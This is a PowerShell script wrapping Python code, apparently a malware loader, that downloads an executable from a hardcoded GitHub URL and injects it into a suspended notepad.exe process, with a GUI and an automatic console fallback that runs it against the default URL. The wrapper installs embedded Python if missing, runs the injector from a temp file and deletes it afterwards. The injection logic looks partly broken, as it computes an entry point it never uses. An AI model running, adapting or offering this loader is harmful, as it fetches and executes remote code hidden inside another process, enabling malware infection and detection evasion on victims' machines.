# Save this as injector.ps1 or run directly from GitHub
$pythonCode = @'
import ctypes, struct, urllib.request, subprocess, sys, os

# Define Windows types
DWORD = ctypes.c_ulong
WORD = ctypes.c_ushort
HANDLE = ctypes.c_void_p
LPWSTR = ctypes.c_wchar_p
BYTE = ctypes.c_ubyte
ULONGLONG = ctypes.c_ulonglong
SIZE_T = ctypes.c_size_t

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", DWORD), ("lpReserved", LPWSTR), ("lpDesktop", LPWSTR),
        ("lpTitle", LPWSTR), ("dwX", DWORD), ("dwY", DWORD),
        ("dwXSize", DWORD), ("dwYSize", DWORD), ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD), ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD), ("wShowWindow", WORD), ("cbReserved2", WORD),
        ("lpReserved2", ctypes.POINTER(BYTE)), ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE), ("hStdError", HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", HANDLE), ("hThread", HANDLE),
        ("dwProcessId", DWORD), ("dwThreadId", DWORD)
    ]

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4

k32 = ctypes.WinDLL('kernel32')
ntdll = ctypes.WinDLL('ntdll')

def download_pe(url):
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            return bytearray(response.read())
    except:
        return None

def inject_pe(pe_url, target="notepad.exe"):
    print(f"[1] Downloading PE from: {pe_url}")
    pe_data = download_pe(pe_url)
    if not pe_data or len(pe_data) < 100:
        print("[-] Download failed")
        return False
    
    if pe_data[0:2] != b'MZ':
        print("[-] Invalid PE file")
        return False
    
    # Parse PE
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[2] PE Size: {image_size:,} bytes")
    
    # Create process
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()
    
    print(f"[3] Creating: {target}")
    if not k32.CreateProcessW(None, target, None, None, False,
                             CREATE_SUSPENDED, None, None,
                             ctypes.byref(si), ctypes.byref(pi)):
        print("[-] CreateProcess failed")
        return False
    
    # Allocate memory
    alloc_addr = k32.VirtualAllocEx(pi.hProcess, 0, image_size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not alloc_addr:
        print("[-] Allocation failed")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[4] Allocated: {hex(alloc_addr)}")
    
    # Write PE
    written = SIZE_T(0)
    
    # Write headers
    opt_size = struct.unpack('<H', pe_data[pe_offset+20:pe_offset+22])[0]
    header_size = pe_offset + 24 + opt_size
    
    k32.WriteProcessMemory(pi.hProcess, alloc_addr,
                          ctypes.c_char_p(bytes(pe_data[:header_size])),
                          header_size, ctypes.byref(written))
    
    # Write sections
    num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
    section_table = pe_offset + 248
    
    for i in range(num_sections):
        sec_start = section_table + (i * 40)
        if sec_start + 40 > len(pe_data):
            break
        
        va = struct.unpack('<I', pe_data[sec_start+12:sec_start+16])[0]
        raw_size = struct.unpack('<I', pe_data[sec_start+16:sec_start+20])[0]
        raw_offset = struct.unpack('<I', pe_data[sec_start+20:sec_start+24])[0]
        
        if raw_size > 0:
            section_data = pe_data[raw_offset:raw_offset + raw_size]
            k32.WriteProcessMemory(pi.hProcess, alloc_addr + va,
                                  ctypes.c_char_p(bytes(section_data)),
                                  raw_size, ctypes.byref(written))
    
    # Set entry point and resume
    entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
    entry_addr = alloc_addr + entry_point
    
    # Simple method - just resume
    print("[5] Resuming thread")
    k32.ResumeThread(pi.hThread)
    
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Injection complete!")
    return True

# GUI version with tkinter
def gui_version():
    try:
        import tkinter as tk
        from tkinter import ttk, messagebox
        
        root = tk.Tk()
        root.title("PE Injector")
        root.geometry("400x300")
        
        ttk.Label(root, text="PE File URL:").pack(pady=10)
        url_entry = ttk.Entry(root, width=50)
        url_entry.pack(pady=5)
        url_entry.insert(0, "https://github.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/raw/main/RhAS8@nga/rCTnJexpp1.exe")
        
        ttk.Label(root, text="Target Process:").pack(pady=10)
        target_entry = ttk.Entry(root, width=30)
        target_entry.pack(pady=5)
        target_entry.insert(0, "notepad.exe")
        
        def do_inject():
            url = url_entry.get()
            target = target_entry.get()
            if inject_pe(url, target):
                messagebox.showinfo("Success", "Injection completed")
            else:
                messagebox.showerror("Error", "Injection failed")
        
        ttk.Button(root, text="Inject", command=do_inject).pack(pady=20)
        root.mainloop()
    except:
        # Console version if tkinter fails
        print("Running console version...")
        url = "https://github.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/raw/main/RhAS8@nga/rCTnJexpp1.exe"
        target = "notepad.exe"
        inject_pe(url, target)

if __name__ == "__main__":
    gui_version()
'@

# Write Python code to temp file
$tempDir = [System.IO.Path]::GetTempPath()
$pythonFile = Join-Path $tempDir "pe_injector_$(Get-Random).py"
$pythonCode | Out-File -FilePath $pythonFile -Encoding UTF8

# Check for Python
$pythonPath = ""
if (Get-Command python -ErrorAction SilentlyContinue) {
    $pythonPath = "python"
} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {
    $pythonPath = "python3"
} elseif (Test-Path "C:\Python39\python.exe") {
    $pythonPath = "C:\Python39\python.exe"
} elseif (Test-Path "C:\Python38\python.exe") {
    $pythonPath = "C:\Python38\python.exe"
} elseif (Test-Path "C:\Python310\python.exe") {
    $pythonPath = "C:\Python310\python.exe"
} else {
    Write-Host "Python not found. Installing embedded Python..."
    
    # Download embedded Python
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip"
    $zipPath = Join-Path $tempDir "python_embed.zip"
    $pythonDir = Join-Path $tempDir "python_embed"
    
    Invoke-WebRequest -Uri $pythonUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $pythonDir -Force
    $pythonPath = Join-Path $pythonDir "python.exe"
    
    # Add pip
    $getpipUrl = "https://bootstrap.pypa.io/get-pip.py"
    $getpipPath = Join-Path $pythonDir "get-pip.py"
    Invoke-WebRequest -Uri $getpipUrl -OutFile $getpipPath
    & $pythonPath $getpipPath
}

# Run the Python injector
Write-Host "Starting PE Injector..." -ForegroundColor Green
Write-Host "Python path: $pythonPath" -ForegroundColor Yellow
Write-Host "Script: $pythonFile" -ForegroundColor Yellow

& $pythonPath $pythonFile

# Cleanup
Start-Sleep -Seconds 2
Remove-Item $pythonFile -Force -ErrorAction SilentlyContinue
